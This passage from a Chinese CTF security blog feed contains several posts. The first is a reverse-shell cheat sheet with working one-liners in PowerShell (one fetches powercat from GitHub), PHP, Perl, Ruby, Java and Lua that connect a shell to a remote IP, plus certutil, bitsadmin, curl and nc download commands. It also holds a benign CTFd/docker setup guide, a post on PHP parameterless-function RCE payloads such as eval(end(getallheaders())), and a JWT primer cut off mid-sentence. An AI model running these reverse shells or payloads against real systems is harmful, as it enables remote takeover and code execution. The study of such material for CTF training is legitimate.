System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure><p>用于windows的反弹shell</p><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><p>方法1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure><p>方法2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><p>方法1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &#39;exit if fork;c&#x3D;TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd&#x3D;c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</span><br></pre></td></tr></table></figure><p>方法2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&#39;f&#x3D;TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><br></pre></td></tr></table></figure><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class Revs &#123;</span><br><span class="line">    &#x2F;**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    *&#x2F;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; TODO Auto-generated method stub</span><br><span class="line">        Runtime r &#x3D; Runtime.getRuntime();</span><br><span class="line">        String cmd[]&#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p &#x3D; r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t&#x3D;socket.tcp();t:connect(&#39;x.x.x.x&#39;,&#39;5555&#39;);os.execute(&#39;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;</span><br></pre></td></tr></table></figure><h2 id="shell下载文件"><a href="#shell下载文件" class="headerlink" title="shell下载文件"></a>shell下载文件</h2><p>先把文件放到有公网的服务器上</p><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>方法1(powershell):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile( &#39;http:&#x2F;&#x2F;****&#x2F;***&#39;,&#39;C:&#x2F;Users&#x2F;Public&#x2F;a.exe&#39;)</span><br></pre></td></tr></table></figure><p>方法2(certutil)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;***&#x2F;a.exe C:&#x2F;Users&#x2F;a.exe</span><br></pre></td></tr></table></figure><p>方法3(bitsadmin):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;download.fb.com&#x2F;file&#x2F;xx.zip c:\pentest\xx.zip</span><br></pre></td></tr></table></figure><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>方法1(curl):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O http:&#x2F;&#x2F;****&#x2F;a.exe</span><br></pre></td></tr></table></figure><p>方法2(nc):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 在 45.77.17.128 这台主机监听 9988 端口（注意符号是 &quot;&lt;&quot; ）</span><br><span class="line"># nc -l 9988 &lt; Python-3.6.6.tar.xz</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在 192.168.1.254 这台主机下载文件（注意符号是 &quot;&gt;&quot; ）</span><br><span class="line"># nc --recv-only 45.77.17.128 9988 &gt; Python-3.6.6.tar.xz</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在 45.77.17.128 这台主机监听 9988 端口（注意符号是 &quot;&gt;&quot; ）</span><br><span class="line"># nc -l 9988 &gt; command.tar.gz</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在 192.168.1.254 这台主机上传文件（注意符号是 &quot;&lt;&quot; ）</span><br><span class="line"># nc --send-only 45.77.17.128 9988 &lt; command.tar.gz</span><br></pre></td></tr></table></figure><p>方法3(wegt):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wegt http:&#x2F;&#x2F;****&#x2F;a.sh</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="http://www.gtfly.top/2019/05/09/%E5%8F%8D%E5%BC%B9shell.html">http://www.gtfly.top/2019/05/09/反弹shell.html</a></p><p><a href="https://brucetg.github.io/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/">https://brucetg.github.io/2018/05/03/多种姿势反弹shell/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu16.04 CTFd平台搭建</title>
      <link href="2019/11/13/ctfd-build/"/>
      <url>2019/11/13/ctfd-build/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了如何在ubuntu16.04用docker搭建平台，以及部署题目等等！</p><a id="more"></a><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>安装前先说一下我的环境，阿里云学生机</p><p><strong>安装git</strong>(有的话忽略）</p><pre><code>sudo apt-get updatesudo apt-get install git</code></pre><p><strong>安装docker</strong></p><p>卸载旧版本的docker</p><pre><code>sudo apt-get remove docker docker-engine docker.io containerd runc</code></pre><p>安装以下包以使apt可以通过HTTPS使用存储库（repository）</p><pre><code>sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</code></pre><p>添加Docker官方的GPG密钥</p><pre><code>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</code></pre><p>使用下面的命令来设置stable官方存储库</p><pre><code>sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot;</code></pre><p>或者使用阿里云镜像，使用下面（推荐使用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository \</span><br><span class="line"><span class="string">&quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu \</span></span><br><span class="line"><span class="string"><span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">stable&quot;</span></span><br></pre></td></tr></table></figure><p>再更新一下apt包索引</p><pre><code>sudo apt-get update</code></pre><p>安装dockerce</p><pre><code>sudo apt-get install docker-ce docker-ce-cli containerd.io</code></pre><p>查看是否安装成功</p><pre><code>docker version</code></pre><p><img src="/2019/11/13/ctfd-build/20191113195206.png"></p><p>查看docker服务是否启动</p><pre><code>systemctl status docker</code></pre><p>若未启动，则启动docker服务</p><pre><code>sudo systemctl start docker</code></pre><p>试着运行</p><pre><code>sudo docker run hello-world</code></pre><p><strong>安装docker-compose</strong></p><pre><code>sudo apt-get install docker-compose</code></pre><p>检查是否安装成功</p><pre><code>docker-compose version</code></pre><p><strong>安装CTFd</strong></p><p>克隆库</p><pre><code>git clone https://github.com/CTFd/CTFd.gitcd CTFd/</code></pre><p>安装操作系统需要安装的包</p><pre><code>./prepare.sh</code></pre><p>安装python需要的包</p><pre><code>pip install -r requirements.txt</code></pre><p>运行CTFd</p><pre><code>python serve.py</code></pre><p>可以测试以下是否成功</p><pre><code>curl 127.0.0.1:4000</code></pre><p>完成以上步骤只是在本地搭起服务器，要是想在公网（物理机）访问，还需要安装gunicorn</p><h2 id="gunicorn部署CTFd"><a href="#gunicorn部署CTFd" class="headerlink" title="gunicorn部署CTFd"></a>gunicorn部署CTFd</h2><p>安装</p><pre><code>pip install gunicorn</code></pre><p>启动服务，在克隆的CTFd文件夹</p><pre><code>gunicorn --bind 0.0.0.0:4000 -w 5 &quot;CTFd:create_app()&quot;(gunicorn --bind 0.0.0.0:8000 -w 5 &quot;CTFd:create_app()&quot;&amp;)// 这里加了()还有&amp;是为了那能够后台运行</code></pre><p>表示绑定端口号4000,有5个进程来处理请求</p><p>使用gunicorn启动服务，访问本机ip+端口即可，公网访问响应很慢</p><p><strong>注意：</strong></p><ol><li>阿里云安全组默认不开放4000端口，需要在安全组设置</li><li>用宝塔的话，安全-&gt;防火墙里需要放行端口（坑了我很久）</li></ol><p><strong>配置mysql</strong></p><p>这个我没试过，可以参见这个<a href="https://blog.csdn.net/z1592570975/article/details/82912801">https://blog.csdn.net/z1592570975/article/details/82912801</a></p><h2 id="docker部署CTFd"><a href="#docker部署CTFd" class="headerlink" title="docker部署CTFd"></a>docker部署CTFd</h2><p>还有种方式就是把CTFd直接放docker里，无需苦恼环境问题,直接pull官方提供的依赖环境,搭建后的访问速度明显提升</p><p>在CTFd文件夹里</p><pre><code>docker-compose up -d</code></pre><p>如果出现以下错误，可能是docker-compose版本问题，因为之前用apt-get安装的，可能版本有点老</p><p><img src="/2019/11/13/ctfd-build/20191114175009.png"></p><p>出现这个问题发现用</p><pre><code>pip uninstall texttable</code></pre><p>卸载不了，那就</p><pre><code>cd /usr/lib/python(你的版本号)/dist-packages/rm -rf texttable-*.egg-info</code></pre><p>然后再重新</p><pre><code>pip install docker-compose</code></pre><p>发现可以安装成功，然后</p><pre><code>cd /CTFddocker-compose up -d</code></pre><p>这个过程可能有点漫长，耐心等待就好</p><h2 id="优化配置"><a href="#优化配置" class="headerlink" title="优化配置"></a>优化配置</h2><h3 id="CTFd汉化"><a href="#CTFd汉化" class="headerlink" title="CTFd汉化"></a>CTFd汉化</h3><p><strong>汉化</strong></p><p>下载<a href="http://test.moonback.xyz/themes.zip">主题汉化包</a></p><p>将<code>CTFd/CTFd/themes</code>文件夹替换即可</p><h3 id="docker镜像换源"><a href="#docker镜像换源" class="headerlink" title="docker镜像换源"></a>docker镜像换源</h3><p>docker默认源为国外官方的，下载速度较慢；更换源：</p><p>修改或新增<code>/etc/docker/daemon.json</code>：</p><pre><code>vi /etc/docker/daemon.json</code></pre><p>写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&quot;registry-mirrors&quot;: [&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再重启即可</p><h2 id="docker基本使用"><a href="#docker基本使用" class="headerlink" title="docker基本使用"></a>docker基本使用</h2><p>doker部署的东西分为镜像和容器两种，有什么区别呢？</p><p><strong>镜像：</strong></p><p>多个只读层叠加在一起，层与层之间通过指针关联，这些层能够在运行Docker的宿主机的文件系统上访问到</p><p><strong>容器：</strong></p><p>容器和容器镜像一样，也是若干层的叠加，唯一区别是所有只读层的最上面一层，是一层可读可写层，初学者可以记住这个简单的公式：容器 = 容器镜像 + 可读可写层</p><h3 id="docker镜像常见命令"><a href="#docker镜像常见命令" class="headerlink" title="docker镜像常见命令"></a>docker镜像常见命令</h3><p>查看所有下载的镜像：</p><pre><code>sudo docker images</code></pre><p>搜索镜像：</p><pre><code>sudo docker search 镜像名称</code></pre><p>获取镜像：</p><pre><code>sudo docker pull 镜像名称</code></pre><p>运行镜像：</p><pre><code>sudo docker run -d --name 容器名称 -p 80:80 镜像名称-d：后台运行-name：容器名称(自己命名)-p：指定docker运行此镜像所使用的端口，第一个是外网端口，第二个是内网端口–privileged：使用该参数，container内的root拥有真正的root权限-i：以交互模式运行容器-t：为容器重新分配一个伪输入终端–link 其他容器：将该容器与其他容器进行连接</code></pre><p>删除镜像：</p><pre><code>sudo docker rmi -f IMAGE-ID/name</code></pre><p>其中，IMAGE-ID可在镜像列表中查看；只需使用IMAGE ID前四位即可；也可以使用镜像的名字</p><h3 id="docker容器常见命令"><a href="#docker容器常见命令" class="headerlink" title="docker容器常见命令"></a>docker容器常见命令</h3><p>查看容器列表：</p><pre><code>sudo docker ps -a</code></pre><p>停止容器：</p><pre><code>sudo docker stop CONTAINER-ID/name</code></pre><p>其中，CONTAINER ID可在容器列表中查看；只需使用CONTAINER ID前四位即可；也可以使用运行镜像时所命名的容器名字</p><p>运行容器：</p><pre><code>sudo docker start CONTAINER-ID/name</code></pre><p>删除容器(容器需已停止运行)：</p><pre><code>sudo docker rm CONTAINER-ID/name</code></pre><p>进入容器(不知道什么原因，使用docker attach命令无法进入到容器中～)</p><pre><code>sudo docker exec -it CONTAINER-ID/name /bin/bash</code></pre><p>不能用的话可以试试</p><pre><code>sudo docker exec -it  CONTAINER-ID/name /bin/sh sudo docker exec -it  CONTAINER-ID/name bash</code></pre><p>拷贝文件</p><pre><code>docker cp ~/index.php 容器id:/var/www/html</code></pre><h2 id="动态靶机搭建"><a href="#动态靶机搭建" class="headerlink" title="动态靶机搭建"></a>动态靶机搭建</h2><h2 id="动态flag搭建"><a href="#动态flag搭建" class="headerlink" title="动态flag搭建"></a>动态flag搭建</h2><p>可以参见这几位大佬的文章</p><p><a href="https://www.zhaoj.in/read-6333.html">https://www.zhaoj.in/read-6333.html</a><br><a href="http://www.gtfly.top/2019/09/27/CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99.html">http://www.gtfly.top/2019/09/27/CTFd动态docker镜像编写.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTFd </tag>
            
            <tag> docker </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php无参数函数利用</title>
      <link href="2019/11/12/php-nopara-rce/"/>
      <url>2019/11/12/php-nopara-rce/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了php无参数函数利用的一些方法，以及实现rce的示例！</p><a id="more"></a><h2 id="一道有意思的题"><a href="#一道有意思的题" class="headerlink" title="一道有意思的题"></a>一道有意思的题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下正则部分:</p><p><code>\W</code>匹配任何一个字母或者数字或者下划线以外的字符</p><p><code>[]</code>代表字符集</p><p><code>[^\W]</code>表示只能匹配任何一个字母或者数字或者下划线，<code>^[abc]</code>则表示匹配以a或b或c开头的</p><p><code>+</code>表示匹配前面的子表达式一次或多次，<code>*</code>表示匹配前面的子表达式零次或多次，<code>?</code>表示匹配前面的子表达式零次或一次</p><p>后面的<code>\(</code>和<code>\)</code>表示括号的转义</p><p><code>(?R)?</code>表示引用当前表达式的意思</p><p>这个正则表示的意思大概就是：匹配无参数的函数或者嵌套函数，例如<code>phpinfo()</code></p><p>这道题只要能构造类似无参函数，就可以执行传过去的内容</p><h2 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h2><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p><img src="/2019/11/12/php-nopara-rce/20191125164210.png"></p><p>一般的payload:</p><pre><code>eval(end(getallheaders()))        //获取http请求头中最后一个参数的值，并执行</code></pre><p>关于end函数：</p><p><img src="/2019/11/12/php-nopara-rce/20191125164622.png"></p><p>同样的有类似的函数</p><p><img src="/2019/11/12/php-nopara-rce/20191125170718.png"></p><p>利用的时候可以直接bp抓包在http头最后面加上要执行的代码</p><p><img src="/2019/11/12/php-nopara-rce/20191125164947.png"></p><h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h3><p><img src="/2019/11/12/php-nopara-rce/20191125171136.png"></p><p>一般的payload:</p><pre><code>eval(arrar_rand(array_flip(getenv())))    //获取所有环境变量，返回一个数组，反转键值，随机其中一个执行</code></pre><p><code>array_flip()</code>函数：</p><p><img src="/2019/11/12/php-nopara-rce/20191125173516.png"></p><p><code>array_rand()</code>函数：</p><p><img src="/2019/11/12/php-nopara-rce/20191125173741.png"></p><p>一般与下面的超全局变量结合，可以用爆破的方式来执行恶意参数</p><pre><code>$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV    //等价于getenv()函数</code></pre><h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><p><img src="/2019/11/12/php-nopara-rce/20191126202817.png"></p><p><img src="/2019/11/12/php-nopara-rce/20191126203822.png"></p><p>一般的payload：</p><pre><code>eval(reset(current(get_defined_vars())))    </code></pre><p><code>current()</code>函数：</p><p><img src="/2019/11/12/php-nopara-rce/20191126204319.png"></p><p><code>reset</code>函数：</p><p><img src="/2019/11/12/php-nopara-rce/20191126204440.png"></p><p>一般与下面的超全局变量结合，可以用爆破的方式来执行恶意参数</p><pre><code>$GLOBALS$_SERVER$_GET$_POST$_FILES$_COOKIE$_SESSION$_REQUEST$_ENV    //等价于getenv()函数</code></pre><h3 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h3><p><img src="/2019/11/12/php-nopara-rce/20191126204727.png"></p><p>因为PHPSESSID必须为大小写字母、数字、下划线构成的字符串，所以我们需要绕过，可以先对执行的代码十六进制转换，再用<code>hex2bin()</code>函数转换过来，<code>706870696e666f28293b</code>是<code>phpinfo();</code>十六进制形式</p><p><img src="/2019/11/12/php-nopara-rce/20191126212227.png"></p><p>成功返回phpinfo</p><p>一般的payload:</p><pre><code>eval(hex2bin(session_id(session_start())))</code></pre><p><code>hex2bin()</code>函数：</p><p><img src="/2019/11/12/php-nopara-rce/20191126210821.png"></p><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">读文件：</span><br><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))</span><br></pre></td></tr></table></figure><h2 id="GXY-安恒月赛"><a href="#GXY-安恒月赛" class="headerlink" title="GXY(安恒月赛)"></a>GXY(安恒月赛)</h2><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题就没法用<code>getallheaders()</code>那种方法了，直接上payload:</p><pre><code>?exp=readfile(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><p>解释一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">localeconv()&#x2F;&#x2F;返回一包含本地数字及货币格式信息的数组</span><br><span class="line">current()&#x2F;&#x2F;返回当前被内部指针指向的数组单元的值，并不移动指针</span><br><span class="line">scandir()&#x2F;&#x2F;列出指定路径中的文件和目录</span><br><span class="line">readfile()&#x2F;&#x2F;读取文件并写入到输出缓冲</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> php函数 </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JWT学习</title>
      <link href="2019/11/06/json-web-token/"/>
      <url>2019/11/06/json-web-token/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要记录了JWT机制的学习过程！</p><a id="more"></a><h2 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT?"></a>什么是JWT?</h2><p>JWT全称JSON WEB Token，是用于身份认证的</p><p>为什么要有身份认证？</p><p>主要是因为HTTP是无状态的，同样让HTTP有状态的方式还有：session,cookie</p><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>cookie 是一个非常具体的东西，指的就是浏览器里面能永久存储的一种数据。跟服务器没啥关系，仅仅是浏览器实现的一种数据存储功能。</p><p>cookie由服务器生成，发送给浏览器，浏览器把cookie以KV形式存储到某个目录下的文本文件中，下一次请求同一网站时会把该cookie发送给服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用，同时不会占据太多磁盘空间。所以每个域的cookie数量是有限制的。</p><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>session从字面上讲，就是会话。这个就类似你和一个人交谈，你怎么知道当时和你交谈的是张三而不是李四呢？对方肯定有某种特征（长相等）表明他是张三；</p><p>session也是类似的道理，服务器要知道当前请求发给自己的是谁。为了做这种区分，服务器就是要给每个客户端分配不同的”身份标识”，然后客户端每次向服务器发请求的时候，都带上这个”身份标识“，服务器就知道这个请求来自与谁了。至于客户端怎么保存这个”身份标识“，可以有很多方式，对于浏览器客户端，大家都采用cookie的方式。</p><h2 id="Json-Web-Token结构"><a href="#Json-Web-Token结构" class="headerlink" title="Json Web Token结构"></a>Json Web Token结构</h2><p>JSON Web Tokens由dot（.）分隔的三个部分组成，它们是：</p><ol><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ol><p>因此，JWT通常如下展示：</p><pre><code>xxxxx.yyyyy.zzzz</code></pre><p><img src="/2019/11/06/json-web-token/16b4fb176b42367c.png"></p><p><strong>组成:</strong></p><ol><li>uid: 用户唯一身份标识</li><li>time: 当前时间的时间戳</li><li>sign: 签名, 使用 hash/encrypt 压缩成定长的十六进制字符串，以防止第三方恶意拼接</li><li>固定参数(可选): 将一些常用的固定参数加入到 token 中是为了避免重复查库</li></ol><p><strong>Header（头部）</strong></p><pre><code>Header 是一个 JSON 对象&#123;  &quot;alg&quot;: &quot;HS256&quot;, // 表示签名的算法，默认是 HMAC SHA256（写成 HS256）  &quot;typ&quot;: &quot;JWT&quot;  // 表示Token的类型，JWT 令牌统一写为JWT&#125;</code></pre><p><strong>Payload（负载）</strong></p><pre><code>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据&#123;  // 7个官方字段  &quot;iss&quot;: &quot;a.com&quot;, // issuer：签发人  &quot;exp&quot;: &quot;1d&quot;, // expiration time： 过期时间  &quot;sub&quot;: &quot;test&quot;, // subject: 主题  &quot;aud&quot;: &quot;xxx&quot;, // audience： 受众  &quot;nbf&quot;: &quot;xxx&quot;, // Not Before：生效时间  &quot;iat&quot;: &quot;xxx&quot;, // Issued At： 签发时间  &quot;jti&quot;: &quot;1111&quot;, // JWT ID：编号  // 可以定义私有字段  &quot;name&quot;: &quot;John Doe&quot;,  &quot;admin&quot;: true&#125;</code></pre><p>JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</p><p><strong>Signature（签名）</strong></p><p>Signature 是对前两部分的签名，防止数据被篡改。</p><p>首先，需要指定一个密钥(secret)。这个密钥只有服务器才知道，不能泄露给用户。然后，使用Header里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p><pre><code>HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</code></pre><p>算出签名后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p><pre><code>JWT = Base64(Header) + &quot;.&quot; + Base64(Payload) + &quot;.&quot; + 